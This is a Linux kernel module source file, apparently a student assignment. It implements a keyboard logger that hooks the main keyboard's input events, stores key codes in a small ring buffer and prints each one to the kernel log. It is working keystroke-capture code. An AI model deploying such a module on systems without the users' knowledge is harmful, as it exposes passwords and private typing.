#include "logger.h"
#include <linux/slab.h>		/* Memory allocation used */
#include <linux/input.h>
#include <linux/string.h>	/* Cannot use C library... */
#include <linux/kernel.h>	/* We're doing kernel work */
#include <linux/module.h>	/* Specifically, a module */

MODULE_DESCRIPTION("Keyboard logger - Assignment 2");
MODULE_AUTHOR("Ianchis Bogdan <ianchisbogdan@gmail.com>");
MODULE_LICENSE("GPL v2");

#define DEVICE_NAME "AT Translated Set 2 keyboard"

#define ATRW atomic_read ( &core.wHead )
#define ATRR atomic_read ( &core.rHead )

static const struct input_device_id idsOfInterest[] = {
	{
		.flags = INPUT_DEVICE_ID_MATCH_EVBIT,
		.evbit = { BIT_MASK(EV_KEY) },
	},
	{ },
};
MODULE_DEVICE_TABLE ( input, idsOfInterest );

static int myConnect(struct input_handler *handler, struct input_dev *dev,const struct input_device_id *id);
static void myDisconnect(struct input_handle *handle);
static bool myFilter(struct input_handle *handle, unsigned int type, unsigned int code, int value);

struct logbuf core;

static int myConnect(struct input_handler *handler, struct input_dev *dev,const struct input_device_id *id) {
	int error;
	struct input_handle *handle;
	if(strcasecmp(dev->name,DEVICE_NAME)) {
		return 0;
	}
	printk(KERN_INFO "Using device \"%s\" for sending events\n",dev->name);
	core.device = dev;
	handle=kzalloc(sizeof(struct input_handle),GFP_KERNEL);
	if(handle==NULL) {
		printk(KERN_ERR "Could not register handle\n");
		return -ENOMEM;
	}
	printk(KERN_INFO "Connect to device \"%s\"\n",dev->name);	
	handle->dev=dev;
	handle->handler=handler;
	handle->name="Logger";
	error=input_register_handle(handle);
	if(error) {
		printk(KERN_ERR "Could not register handle\n");
		return error;
	}
	error=input_open_device(handle);
	if(error) {
		input_unregister_handle(handle);
		printk(KERN_ERR "Could not open handle\n");
		return error;
	}
	return 0;
}

static void myDisconnect(struct input_handle *handle) {
	if(handle==NULL) {
		return;
	}
	printk(KERN_INFO "Disconnect from device \"%s\"\n",handle->dev->name);
	input_close_device(handle);
	input_unregister_handle(handle);
	handle->dev=NULL;
	handle->handler=NULL;
	kfree(handle);
}
 
static bool myFilter(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
	bool suppress=false;
	if ( type==EV_KEY ) {
		int i, delta;
		for ( i = 0; i < 1; i++ ) {		// might have to deal with a variable amount of bytes from the code input
			// used sizeof( unsigned int ) but it would lead to a lot of 0 dummy values
			delta = ( code >> ( i * 8 ) ) & 0xFF;
			core.payload [ ATRW ] = delta;
			printk ( KERN_INFO "Code from %d : %d @ %d", ATRW, code, delta );
			if ( ATRW + 1 == ATRR ) {
				atomic_set ( &core.rHead, ( ATRR + 1 ) % core.capacity );
			}
			atomic_set ( &core.wHead, ( ATRW + 1 ) % core.capacity );
		}
	}
	return suppress;
}

static int logger_init(void) {
	int res;
	core.device=NULL;
	core.capacity = 10;
	
	core.inputHandler.name= "Logger";
	core.inputHandler.connect=myConnect;
	core.inputHandler.disconnect=myDisconnect;
	core.inputHandler.filter=myFilter;
	core.inputHandler.id_table=idsOfInterest;
	
	atomic_set( &core.rHead, 0 );
	atomic_set( &core.wHead, 0 );
	
	res=input_register_handler(&core.inputHandler);
	
	if(res) {
		printk(KERN_ERR "Could not register input handler: %d\n",res);
		return res;
	}			
	res=procFsInit();
	if(res) {
		input_unregister_handler(&core.inputHandler);
		return res;
	}
	printk(KERN_INFO "Keyboard logger added: %s\n",res?"FAIL":"Success");
	return res;
}

static void logger_cleanup(void) {
	input_unregister_handler(&core.inputHandler);
	procFsCleanup();
	printk(KERN_INFO "Keyboard logger removed\n");
}

module_init(logger_init);
module_exit(logger_cleanup);
